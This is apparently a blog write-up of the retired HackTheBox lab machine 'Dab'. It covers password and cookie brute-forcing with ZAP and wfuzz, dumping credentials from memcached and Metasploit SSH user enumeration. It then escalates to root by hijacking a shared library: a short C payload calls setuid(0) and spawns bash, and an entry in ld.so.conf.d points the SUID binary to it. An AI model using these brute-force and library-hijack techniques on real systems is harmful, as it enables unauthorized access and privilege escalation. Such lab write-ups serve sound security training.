## Quick Summary
<br> Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It's a linux box and it's ip is 10.10.10.86 so let's jump right in.
![](/images/hackthebox/dab/0.png)
<hr>
## Nmap 
<br> As always we will start by running nmap 
<br> note : I added the ip to `/etc/hosts` as dab.htb
`nmap -sV -sT -sC dab.htb`
![](/images/hackthebox/dab/1.png)
<br> We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx.
<br> Let's take a look at the ftp server.
<br>
<hr>
## FTP
<br> anonymous login succeeds , then by listing the files we only see one file `dab.jpg`
![](/images/hackthebox/dab/2.png)
<br> We will download it `get dab.jpg` then we will take a look at that image.
![](/images/hackthebox/dab/dab.jpg)
<br> Nothing really special , maybe steganography ? Let's try steghide 
`steghide info dab.jpg`
![](/images/hackthebox/dab/3.png)
<br> And for password I left it blank and it was accepted !
<br> Next step is to extract that txt file 
`steghide extract -sf dab.jpg`
![](/images/hackthebox/dab/4.png)
<br> Cool let's `cat` it.
![](/images/hackthebox/dab/5.png)
<br> And , Nope...
<br> So we just got trolled , next thing is to look at http
<br> Check out my [steganography list](/lists/stego)
<br>
<hr>
## HTTP
<br> On port 80 there's a login page.
![](/images/hackthebox/dab/6.png)
<br> And port 8080 tells us : `Access denied: password authentication cookie not set`
![](/images/hackthebox/dab/7.png)
<br> Bruteforcing sub directories with gobuster wasn't helpful , port 80 had only `/login` and `/login`. Normal stuff
![](/images/hackthebox/dab/8.png)
<br> And port 8080 had nothing.
![](/images/hackthebox/dab/9.png)
<hr>
## HTTP port 80
<br> Let's enumerate the first port and see what we can get.
<br> The most common credentials `admin:admin` didn't work and we get `Error: Login failed`
![](/images/hackthebox/dab/10.png)
<br> If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters `username` and `password`
![](/images/hackthebox/dab/11.png)
<br> At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it's very slow in the community version.
<br>
<hr>
## Fuzzing with ZAP
<br> First thing to mention is the wordlist , because we are bruteforcing remotely it's better to use a small wordlist so we won't use rockyou here. I used [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) from [Seclists](https://github.com/danielmiessler/SecLists)
<br> Let's start zap and intercept the request again.
![](/images/hackthebox/dab/12.png)
<br> Then right click --> attack --> fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value.
![](/images/hackthebox/dab/13.png)
<br> Add --> Add then we paste the wordlist contents.
![](/images/hackthebox/dab/14.png)
<br>
<br>
![](/images/hackthebox/dab/15.png)
<br> all the responses will be `200` and 542 bytes , except one response `302` and 209 bytes , for the value `Password1` so that's the password.
![](/images/hackthebox/dab/16.png)
<br> And we get it in , but ... 
![](/images/hackthebox/dab/17.png)
<br> Nothing interesting , was this port important ? correct me if i'm wrong.
<br>
<hr>
## HTTP port 8080
<br> Moving on to the next http port , let's intercept the request with burp and see what can we do with that password authentication cookie.
![](/images/hackthebox/dab/18.png)
<br>
<br>
![](/images/hackthebox/dab/19.png)
<br> Let's add a cookie and name it password , value can be anything we're just testing
![](/images/hackthebox/dab/20.png)
<br>
<br>
![](/images/hackthebox/dab/21.png)
<br> We got another message : `Access denied: password authentication cookie incorrect`
<br> So we just need to get the right value of the cookie and we will get in.
<br> We will use wfuzz to fuzz the cookie 
`wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ`
<br> Then we will terminate it immediately and look how can we filter the output
![](/images/hackthebox/dab/22.png)
<br> All the responses has `324 chars` so we will add `--hh 324` and this will not show us any response with 324 chars
`wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324`
![](/images/hackthebox/dab/23.png)
<br> `secret` gave us a response of 540 , let's try in burp
![](/images/hackthebox/dab/24.png)
<br>
<br>
![](/images/hackthebox/dab/25.png)
<br> next step is to add the cookie , you can use any cookie editor. after that we get this page.
![](/images/hackthebox/dab/26.png)
<br> Finally we got something
<br>
<hr>
## memcached
<br> The very first thing we see is : "Status of cache engine: Online"
<br> cache engine ? after some googling we will find a software called memcached
<br> [https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf](https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf)
> memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects.
 -page 1

<br>
<br>

> By default, memcached uses the following settings:
•  Memory allocation of 64MB
•  Listens for connections on all network interfaces, using port 11211
•  Supports a maximum of 1024 simultaneous connections
 -page 5

<br>
<br>
<br> So we know that memcached runs on port 11211 , let's try any port to test
![](/images/hackthebox/dab/27.png)
<br>
<br>
![](/images/hackthebox/dab/28.png)
<br> We get an internal server error
<br> Now let's try port 11211
![](/images/hackthebox/dab/29.png)
<br>
<br>
![](/images/hackthebox/dab/30.png)
<br> We get `output : ERROR` because we didn't send a valid command , but that's a confirmation that the port is right.
<br> Now we need to know what to put in "line to send"
<br> By looking at this [cheat sheet](https://lzone.de/cheat-sheet/memcached) , the first command we see is `get` which reads a value , first time i did this box i guessed it , just typed `get users` and it worked but the right way to do it is to query the memory statistics with `stats slabs` (as mentioned in the cheat sheet)
![](/images/hackthebox/dab/31.png)
<br>
<br>
![](/images/hackthebox/dab/32.png)
<br> Full output :
```

END

```
<br> By looking at the slab with id 26 we see that the chunk size of it is 27120 , let's dump the keys for this slab 
`stats cachedump 26 0`  
<br> 0 for no result limit
![](/images/hackthebox/dab/33.png)
<br>
<br>
![](/images/hackthebox/dab/34.png)
<br> We get ITEM users
<br> So we do `get users` , however you can just guess it like I said. We get a huge json output of usernames and password hashes.
![](/images/hackthebox/dab/35.png)
<br>
<br>
![](/images/hackthebox/dab/36.png)
<hr>
## SSH enumeration and getting user
<br> Let's copy that output and save it on our box. I saved it in a file and called it users.txt
`cat users.txt`
![](/images/hackthebox/dab/37.png)
<br> And it's a lot of unorganized data , 3 or more pages like this.
<br> we will use a python module called json.tool to get a more clear output
`cat users.txt | python -m json.tool > users2.txt`
<br>
<br>
`cat users2.txt`
![](/images/hackthebox/dab/38.png)
<br> And it's nice now. Let's make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them.
`cat users2.txt | cut -d ":" -f 1 | cut -d '"' -f 2 > usernames.txt`
<br>
<br>
`cat users2.txt | cut -d ":" -f 2 | cut -d '"' -f 2 > hashes.txt`
![](/images/hackthebox/dab/39.png)
<br> To bruteforce ssh we will use a metasploit module called `ssh_enumusers` 
`msfconsole`
<br>
<br>
`use auxiliary/scanner/ssh/ssh_enumusers`
<br>
<br>
`set RHOSTS dab.htb`
<br>
<br>
`set USER_FILE usernames.txt`
<br>
<br>
`set THREADS 20`
![](/images/hackthebox/dab/40.png)
<br> It will run for a while , then it will tell us that it found the user `genevieve`
![](/images/hackthebox/dab/41.png)
<br> now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : 
![](/images/hackthebox/dab/42.png)
<br> Now we need to know which one of these passwords is genevieve's password , so we will grep for genevieve in `users2.txt` then we will grep for the hash in `cracked-hashes.txt`
![](/images/hackthebox/dab/43.png)
<br> And finally we have valid credentials `genevieve:Princess1` , let's ssh
![](/images/hackthebox/dab/44.png)
<br> Finally , we owned user !
<br>
<hr>
## More enumeration
<br> We have a password , let's try `sudo -l` , and we see that we can run this binary as root `/usr/bin/try_harder` , and as the name said ... we should really try harder.
![](/images/hackthebox/dab/45.png)
<br> It gets us a root shell then immediately dies after the first command. We got trolled again :D
<br> `find / -perm -4000` to search for suid binaries and we see something unusual.
![](/images/hackthebox/dab/46.png)
<br> A binary called `myexec` has suid permissions. Let's see what's that.
![](/images/hackthebox/dab/47.png)
<br> It asks for a password and of course "test" is refused , we need to reverse engineer this binary to find the password.
<br>
<hr>
## Getting the password
<br> `scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab` to download the file on our box
![](/images/hackthebox/dab/48.png)
<br> Then we will use radare2
`radare2 myexec`
<br>
<br>
`aaa`
<br>
<br>
`pdf @ main`
![](/images/hackthebox/dab/49.png)
<br> The password is `s3cur3l0g1n` , let's get back to the box and try it 
![](/images/hackthebox/dab/50.png)
<br> And we get: 
```
password is correct 
seclogin() called
TODO: Placeholder for now, function not implemented yet
```
<br> so what can we do now ?
<br>
<hr>
## Hijacking dynamically linked shared object library and getting root
<br> If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so
![](/images/hackthebox/dab/51.png)
<br> and we saw earlier when we executed the binary : `seclogin() called`
<br> So theoretically , if we can replace `libseclogin.so` with another one and link to it , the binary will execute it as root. let's test that.
<br> We will create a directory in `/home/genevieve/` and call it `.exploit`
<br> Then we will write a small c program that spawns bash.
```
#include <stdio.h>

seclogin() {
setgid(0);
setuid(0);
system("/bin/bash");
}
```
![](/images/hackthebox/dab/52.png)
<br> After that we will compile it 
`gcc -fPIC -shared -o libseclogin.so exploit.c`
<br> Now our fake `libseclogin.so` is ready , we need to make the system point to our path `/home/genevieve/.exploit/libseclogin.so` instead of `/usr/lib/libseclogin.so`
<br> We will `cd` to `/etc/ld.so.conf.d` , and create a `.conf` file and put our path in it.
![](/images/hackthebox/dab/53.png)
<br> Then to activate that path we will execute this command `ldconfig`
<br> [This page](https://www.cyberciti.biz/faq/linux-setting-changing-library-path/) helped a lot. 
<br> Let's do `ldd` again:
![](/images/hackthebox/dab/54.png)
<br> The path changed and pointed to our fake library.
<br> Let's own root.
`./myexec`
![](/images/hackthebox/dab/55.png)
<br> And we owned root.
<br>
<br>
<br> That's it , Feedback is appreciated !
